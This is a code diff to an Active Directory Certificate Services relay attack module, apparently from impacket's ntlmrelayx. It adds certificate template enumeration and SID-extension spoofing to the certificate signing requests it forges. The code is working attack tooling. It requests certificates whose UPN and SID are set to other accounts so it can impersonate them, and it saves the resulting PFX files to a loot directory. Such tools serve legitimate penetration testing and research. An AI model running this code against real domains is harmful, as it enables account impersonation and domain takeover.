@@ -18,18 +18,58 @@
 import re
 import base64
 import os
-from OpenSSL import crypto
+import urllib.parse
 
 from cryptography import x509
+from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.serialization import pkcs12
-from cryptography.hazmat.primitives.serialization import NoEncryption
+from cryptography.hazmat.primitives.serialization import NoEncryption, Encoding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
 from cryptography.x509 import ExtensionNotFound, load_pem_x509_certificate
 from cryptography.x509.oid import NameOID, ObjectIdentifier
-from cryptography.hazmat.backends import default_backend
-
-
 
 from impacket import LOG
+
+
+def _tlv(tag, value):
+    n = len(value)
+    if n < 0x80:
+        return bytes([tag, n]) + value
+    elif n < 0x100:
+        return bytes([tag, 0x81, n]) + value
+    else:
+        return bytes([tag, 0x82, (n >> 8) & 0xff, n & 0xff]) + value
+
+
+def _oid_encode(oid_str):
+    parts = [int(x) for x in oid_str.split('.')]
+    first = 40 * parts[0] + parts[1]
+
+    def arc(n):
+        if n < 128:
+            return bytes([n])
+        r = []
+        while n:
+            r.insert(0, n & 0x7f)
+            n >>= 7
+        for i in range(len(r) - 1):
+            r[i] |= 0x80
+        return bytes(r)
+
+    c = arc(first)
+    for p in parts[2:]:
+        c += arc(p)
+    return _tlv(0x06, c)
+
+
+def _encode_sid_ext(sid):
+    """szOID_NTDS_CA_SECURITY_EXT value: GeneralNames containing OtherName[NTDS_OBJECTSID]"""
+    oct_s = _tlv(0x04, sid.encode('utf-8'))
+    val   = _tlv(0xa0, oct_s)
+    oid   = _oid_encode("1.3.6.1.4.1.311.25.2.1")
+    on    = _tlv(0xa0, oid + val)
+    return _tlv(0x30, on)
 
 # cache already attacked clients
 ELEVATED = []
@@ -37,22 +77,57 @@ ELEVATED = []
 
 class ADCSAttack:
     UPN_OID = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
+    NTDS_CA_SECURITY_EXT_OID = ObjectIdentifier("1.3.6.1.4.1.311.25.2")
 
     def _run(self):
-        key = crypto.PKey()
-        key.generate_key(crypto.TYPE_RSA, 4096)
+        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
 
         if self.username in ELEVATED:
             LOG.info('Skipping user %s since attack was already performed' % self.username)
             return
+        
+        if self.config.enumTemplates:
+            templates = self.enum_templates()
+            if templates is None:
+                return
+            # Print the parsed results
+            for entry in templates:
+                try:
+                    LOG.info(f'  - {entry["REALNAME"]}')
+                    LOG.debug(f'    - KEYSPEC: {entry["KEYSPEC"]}')
+                    LOG.debug(f'    - KEYFLAG: {entry["KEYFLAG"]}')
+                    LOG.debug(f'    - ENROLLFLAG: {entry["ENROLLFLAG"]}')
+                    LOG.debug(f'    - PRIVATEKEYFLAG: {entry["PRIVATEKEYFLAG"]}')
+                    LOG.debug(f'    - SUBJECTFLAG: {entry["SUBJECTFLAG"]}')
+                    LOG.debug(f'    - RASIGNATURE: {entry["RASIGNATURE"]}')
+                    LOG.debug(f'    - CSPLIST: {entry["CSPLIST"]}')
+                    LOG.debug(f'    - EXTOID: {entry["EXTOID"]}')
+                    LOG.debug(f'    - EXTMAJ: {entry["EXTMAJ"]}')
+                    LOG.debug(f'    - EXTFMIN: {entry["EXTFMIN"]}')
+                    LOG.debug(f'    - EXTMIN: {entry["EXTMIN"]}')
+                    LOG.debug(f'    - FRIENDLYNAME: {entry["FRIENDLYNAME"]}')
+                except KeyError:
+                    LOG.info(f'  - {entry}')
+            LOG.info("Certificate enumeration complete!")
+            return
 
-        current_template = self.config.template
-        if current_template is None:
-            current_template = "Machine" if self.username.endswith("$") else "User"
+        current_template = self.get_template(self.username, self.config.template)
 
-        csr = self.generate_csr(key, self.username, self.config.altName)
+        # Template name might be UTF-8
+        original_template = current_template
+        current_template = urllib.parse.quote(current_template)
+        if current_template == original_template:
+            LOG.info('Using template name: %s' % current_template)
+        else:
+            LOG.info('Using template name: %s (%s)' % (current_template, original_template))
+
+        altSid = getattr(self.config, 'altSid', None)
+        csr = self.generate_csr(key, self.username, self.config.altName, altSid=altSid)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
-        LOG.info("CSR generated!")
+        if altSid:
+            LOG.info("CSR generated with SID extension: %s" % altSid)
+        else:
+            LOG.info("CSR generated!")
 
         certAttrib = self.generate_certattributes(current_template, self.config.altName)
 
@@ -90,7 +165,7 @@ class ADCSAttack:
 
         cert_obj = load_pem_x509_certificate(certificate.encode(), backend=default_backend())
         pfx_filename = self._sanitize_filename(self.username or self._extract_certificate_identity(cert_obj) or "certificate_{0}".format(certificate_id))
-        certificate_store = self.generate_pfx(key.to_cryptography_key(), cert_obj)
+        certificate_store = self.generate_pfx(key, cert_obj)
         output_path = os.path.join(self.config.lootdir, "{}.pfx".format(pfx_filename))
         LOG.info("Writing PKCS#12 certificate to %s" % output_path)
         try:
@@ -108,20 +183,51 @@ class ADCSAttack:
             LOG.info("This certificate can also be used for user : {}".format(self.config.altName))
 
     @staticmethod
-    def generate_csr(key, CN, altName, csr_type = crypto.FILETYPE_PEM):
+    def get_template(username, template=None):
+        if template is not None:
+            return template
+        return "Machine" if username.endswith("$") else "User"
+
+    @staticmethod
+    def generate_csr(key, CN, altName, csr_type=Encoding.PEM, altSid=None):
         LOG.info("Generating CSR...")
-        req = crypto.X509Req()
 
+        if hasattr(key, 'to_cryptography_key'):
+            key = key.to_cryptography_key()
+
+        if csr_type in (Encoding.PEM, 1):  # OpenSSL.crypto.FILETYPE_PEM == 1
+            encoding = Encoding.PEM
+        elif csr_type in (Encoding.DER, 2):  # OpenSSL.crypto.FILETYPE_ASN1 == 2
+            encoding = Encoding.DER
+        else:
+            raise ValueError("Unsupported CSR encoding")
+
+        subject = []
         if CN:
-            req.get_subject().CN = CN
+            subject.append(x509.NameAttribute(NameOID.COMMON_NAME, CN))
 
+        builder = x509.CertificateSigningRequestBuilder().subject_name(x509.Name(subject))
         if altName:
-            req.add_extensions([crypto.X509Extension(b"subjectAltName", False, b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" %  altName.encode() )])
+            builder = builder.add_extension(
+                x509.SubjectAlternativeName([
+                    x509.OtherName(
+                        ADCSAttack.UPN_OID,
+                        _tlv(0x0c, altName.encode('utf-8'))
+                    )
+                ]),
+                critical=False
+            )
+        if altSid is not None:
+            builder = builder.add_extension(
+                x509.UnrecognizedExtension(
+                    oid=ADCSAttack.NTDS_CA_SECURITY_EXT_OID,
+                    value=_encode_sid_ext(altSid)
+                ),
+                critical=False
+            )
 
-        req.set_pubkey(key)
-        req.sign(key, "sha256")
-
-        return crypto.dump_certificate_request(csr_type, req)
+        csr = builder.sign(key, hashes.SHA256(), default_backend())
+        return csr.public_bytes(encoding)
 
     @staticmethod
     def generate_pfx(key, certificate):
@@ -140,6 +246,57 @@ class ADCSAttack:
         if altName:
             return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
         return "CertificateTemplate:{}".format(template)
+    
+    def enum_templates(self):
+        enum_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }
+
+        # Key mapping for parsing
+        KEY_MAPPING = {
+            0: "OFFLINE",
+            1: "REALNAME",
+            2: "KEYSPEC",
+            3: "KEYFLAG",
+            4: "ENROLLFLAG",
+            5: "PRIVATEKEYFLAG",
+            6: "SUBJECTFLAG",
+            7: "RASIGNATURE",
+            8: "CSPLIST",
+            9: "EXTOID",
+            10: "EXTMAJ",
+            11: "EXTFMIN",
+            12: "EXTMIN",
+            13: "FRIENDLYNAME",
+        }
+
+        LOG.info("Enumerating certificates")
+        self.client.request("GET", "/certsrv/certrqxt.asp", headers=enum_headers)
+        response = self.client.getresponse()
+        content = response.read()
+        if response.status != 200:
+            LOG.error("Error enumerating certificate templates! HTTP %d" % response.status)
+            return None
+        option_lines = re.findall(r"<Option Value.*?>", content.decode())
+        if len(option_lines) == 0:
+            LOG.warning("No certificate template entries found in /certsrv/certrqxt.asp")
+            return None
+
+        parsed_results = []
+        for line in option_lines:
+            # Extract the content after "<Option Value="
+            match = re.search(r"<Option Value=\"(.*?)\">", line)
+            if match:
+                raw_data = match.group(1)
+                # Split the data by semicolon
+                parsed_data = raw_data.split(";")
+                # Map the parsed data using the key mapping
+                parsed_dict = {KEY_MAPPING.get(i, f"UNKNOWN_{i}"): value for i, value in enumerate(parsed_data)}
+                parsed_results.append(parsed_dict)
+        return parsed_results
 
     @classmethod
     def _extract_certificate_identity(cls, cert):
